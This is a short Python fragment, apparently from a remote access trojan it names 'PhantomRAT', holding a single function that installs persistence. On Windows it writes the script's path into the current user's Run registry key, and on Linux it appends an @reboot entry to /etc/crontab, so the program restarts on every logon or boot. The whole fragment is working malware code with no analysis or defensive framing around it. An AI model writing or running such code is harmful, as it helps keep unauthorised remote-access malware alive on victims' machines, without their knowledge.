import os
import platform

def add_persistence():
    if platform.system() == 'Windows':
        # Add to startup
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "PhantomRAT", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)
    else:
        # Linux: add to cron
        cron_job = f"@reboot python3 {os.path.abspath(__file__)}\n"
        with open('/etc/crontab', 'a') as f:
            f.write(cron_job)